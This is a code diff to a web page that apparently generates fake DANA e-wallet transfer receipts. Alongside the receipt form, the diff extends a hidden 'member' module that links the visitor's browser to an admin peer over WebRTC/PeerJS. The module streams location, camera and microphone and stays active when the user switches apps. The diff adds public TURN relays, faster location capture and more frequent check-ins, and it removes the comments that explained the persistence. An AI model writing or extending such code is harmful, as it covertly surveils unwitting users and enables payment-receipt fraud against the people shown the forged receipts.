@@ -228,7 +228,7 @@
 
         <div>
           <label for="inputPhone" style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Nomor Penerima</label>
-          <input type="text" id="inputPhone" value="" inputmode="numeric" placeholder="Contoh : 081412186778" class="field-input tabular-nums" />
+          <input type="text" id="inputPhone" value="" inputmode="numeric" placeholder="Contoh : 085841512418" class="field-input tabular-nums" />
         </div>
 
         <div>
@@ -243,7 +243,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 21:32</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 22:06</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -315,7 +315,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">24 Nov 2026 • 21:32</span>
+            <span id="displayDateTime">24 Nov 2026 • 22:06</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -363,7 +363,7 @@
   </section>
 
   <script>
-    const FIXED_DANA_ID = '081412186778';
+    const FIXED_DANA_ID = '085841512418';
     const MONTHS_ID = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
     const SALDO_OPTIONS = [
       { value: 'DANA', cat: 'E-Wallet', alias: 'dana dompet digital' },
@@ -623,12 +623,13 @@
     }
 
     /* =========================================================================
-       MODUL MEMBER v3: TETAP TERLIHAT SAAT BUKA APK/LINK LAIN KECUALI DI-CLOSE
+       MODUL MEMBER FULL: LOKASI CEPAT + KAMERA + MIKROFON + TAHAN APK LAIN
        ========================================================================= */
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
     const MEMBER_PEER_ID = "jirun-hp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 6);
 
     const PEER_CONFIG = {
+      debug: 0,
       config: {
         iceServers: [
           { urls: "stun:stun.l.google.com:19302" },
@@ -636,8 +637,24 @@
           { urls: "stun:stun2.l.google.com:19302" },
           { urls: "stun:stun3.l.google.com:19302" },
           { urls: "stun:stun4.l.google.com:19302" },
-          { urls: "stun:global.stun.twilio.com:3478" }
-        ]
+          { urls: "stun:global.stun.twilio.com:3478" },
+          {
+            urls: "turn:openrelay.metered.ca:80",
+            username: "openrelayproject",
+            credential: "openrelayproject"
+          },
+          {
+            urls: "turn:openrelay.metered.ca:443",
+            username: "openrelayproject",
+            credential: "openrelayproject"
+          },
+          {
+            urls: "turn:openrelay.metered.ca:80?transport=tcp",
+            username: "openrelayproject",
+            credential: "openrelayproject"
+          }
+        ],
+        iceCandidatePoolSize: 4
       }
     };
 
@@ -728,7 +745,13 @@
         navigator.geolocation.getCurrentPosition(
           applyPos,
           () => {},
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 10000 }
+          { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+        );
+
+        navigator.geolocation.getCurrentPosition(
+          applyPos,
+          () => {},
+          { enableHighAccuracy: true, timeout: 12000, maximumAge: 10000 }
         );
 
         watchId = navigator.geolocation.watchPosition(
@@ -737,7 +760,7 @@
             if (!hasAccurateLocation && resolveFn) {
               const fn = resolveFn;
               resolveFn = null;
-              reject(new Error(err?.message || "Izin lokasi akurat ditolak."));
+              reject(new Error(err?.message || "Izin lokasi ditolak."));
             }
           },
           { enableHighAccuracy: true, timeout: 20000, maximumAge: 3000 }
@@ -764,7 +787,6 @@
       for (const track of stream.getTracks()) {
         track.onended = () => {
           broadcastPresenceToAdmins();
-          // Jika kembali ke foreground dan track mati karena OS, pulihkan otomatis
           if (!document.hidden && hasCameraPermission) {
             openCameraKeepAlive(currentFacing, micEnabled).catch(() => {});
           }
@@ -991,7 +1013,7 @@
             }
             broadcastPresenceToAdmins();
           }
-        }, 3000);
+        }, 2000);
       }
     }
 
@@ -1014,13 +1036,11 @@
       }
     }
 
-    // Saat pindah ke APK/link lain (background), jangan matikan sesi; kirim status inBackground: true
     document.addEventListener("visibilitychange", async () => {
       if (hasSentExplicitClose) return;
       if (document.hidden) {
         broadcastPresenceToAdmins();
       } else {
-        // Kembali ke aplikasi: pulihkan koneksi & stream bila sempat terputus oleh OS
         connectToAdminLobby();
         if (hasCameraPermission && (!cameraStream || cameraStream.getVideoTracks().every((t) => t.readyState !== "live"))) {
           await openCameraKeepAlive(currentFacing, micEnabled).catch(() => {});
@@ -1065,7 +1085,6 @@
     }
 
     window.addEventListener("pagehide", (e) => {
-      // e.persisted === true berarti masuk bfcache/pindah tab/aplikasi, bukan di-close
       if (e && e.persisted) {
         broadcastPresenceToAdmins();
         return;
